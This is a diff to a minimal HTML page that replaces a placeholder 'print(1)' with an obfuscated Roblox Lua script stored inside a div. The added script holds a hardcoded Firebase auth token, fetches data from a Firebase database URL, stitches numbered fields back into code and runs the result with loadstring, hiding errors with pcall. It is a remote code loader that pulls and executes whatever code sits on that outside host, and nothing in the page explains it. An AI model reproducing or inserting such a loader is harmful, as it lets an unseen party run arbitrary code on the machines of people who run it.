@@ -1,6 +1,64 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <div id="code">print(1)</div>
+    <div id="code">local _a = game:GetService("Players")
+local _b = game:GetService("HttpService")
+local _c = _a.LocalPlayer
+local _d = "zyRSUnRt8BqRlIlAM5wnsG8z8y1pdUytuaCkPSj1"
+
+local function _e(_f)
+    pcall(function()
+        if string.find(_f, "firebaseio.com") and not string.find(_f, "auth=") then
+            if string.find(_f, "%?") then
+                _f = _f .. "&auth=" .. _d
+            else
+                _f = _f .. "?auth=" .. _d
+            end
+        end
+        
+        local _g = game:HttpGet(_f)
+        if string.find(_f, "firebaseio.com") then
+            local _h = _b:JSONDecode(_g)
+            if not _h then return end
+            
+            local _i = {}
+            local _j = 0
+            
+            for _k, _l in pairs(_h) do
+                if string.sub(_k, 1, 5) == "line_" then
+                    local _m = tonumber(string.sub(_k, 6))
+                    if _m then
+                        _i[_m] = _l
+                        if _m > _j then _j = _m end
+                    end
+                end
+            end
+            
+            if _j == 0 then return end
+            
+            local _n = ""
+            for _o = 1, _j do
+                if _i[_o] then
+                    _n = _n .. tostring(_i[_o]) .. "\n"
+                end
+            end
+            
+            if _n ~= "" then
+                local _func, _err = loadstring(_n)
+                if _func then
+                    _func()
+                end
+            end
+        else
+            local _func, _err = loadstring(_g)
+            if _func then
+                _func()
+            end
+        end
+    end)
+end
+
+local _p = "https://hgjghjgjhjdf-default-rtdb.firebaseio.com/System/test/.json"
+_e(_p)</div>
 </body>
 </html>
